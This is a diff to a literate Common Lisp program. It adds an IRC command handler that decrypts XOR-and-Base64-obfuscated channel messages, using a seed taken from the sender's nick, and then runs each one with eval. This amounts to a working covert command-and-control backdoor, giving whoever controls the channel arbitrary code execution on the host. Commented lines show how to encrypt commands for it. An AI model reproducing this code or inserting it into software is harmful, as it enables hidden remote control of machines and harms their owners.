@@ -120,18 +120,59 @@
 
 #+NAME: irc_cmd_proc
 #+BEGIN_SRC lisp
+  (defun seq-xor (len seq-1 seq-2)
+    (let ((result (make-array len :element-type '(unsigned-byte 8))))
+      (do ((idx 0 (incf idx)))
+          ((= idx len))
+        (setf (aref result idx)
+              (logxor (aref seq-1 idx)
+                      (aref seq-2 idx))))
+      result))
+
+  (defun encrypt (str seed)
+    (let* ((oct (flex:string-to-octets str :external-format :utf-8))
+           (len (length oct))
+           (gen (prbs:byte-gen 31 :seed seed))
+           (gam (funcall gen len))
+           (enc (seq-xor len oct gam)))
+      (base64:usb8-array-to-base64-string enc)))
+
+  (defun decrypt (base64 seed)
+    (handler-case
+        (let* ((oct (base64:base64-string-to-usb8-array base64))
+               (gen (prbs:byte-gen 31 :seed seed))
+               (len (length oct))
+               (gam (funcall gen len))
+               (cmd (seq-xor len oct gam)))
+          (flex:octets-to-string cmd :external-format :utf-8))
+      (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
+
+  (defmacro bprint (var)
+    `(subseq (with-output-to-string (*standard-output*)
+               (pprint ,var)) 1))
+
   (defparameter *irc-cmd*
     (lambda (param)
       (block irc-cmd-block
-        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
+        (let* ((msg    (cadr (CL-IRC:ARGUMENTS param)))
                (src (CL-IRC:SOURCE param))
-               (vec (handler-case (parse-integer (subseq src 1))
+               (seed (handler-case (parse-integer (subseq src 1))
                       (SB-INT:SIMPLE-PARSE-ERROR ()
-                        (return-from irc-cmd-block nil)))))
+                        (return-from irc-cmd-block nil))))
+               (str (decrypt msg seed)))
           (format t "~%::COMMAND::~A::" msg)
           (format t "~%::SOURCE::~A::" src)
-          (format t "~%::VEC::~A::" vec))
-        (finish-output))))
+          (format t "~%::str::~A::" str)
+          (format t "~%::eval::~A::"
+                  (handler-case (bprint (eval (read-from-string  str)))
+                    (TYPE-ERROR () (return-from irc-cmd-block nil))))
+          (finish-output)))))
+
+  ;; (encrypt
+  ;;  "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))" 3783969158)
+
+  ;; (encrypt
+  ;;  "(snd)" 3783969158)
 #+END_SRC
 
 ** Join to channel
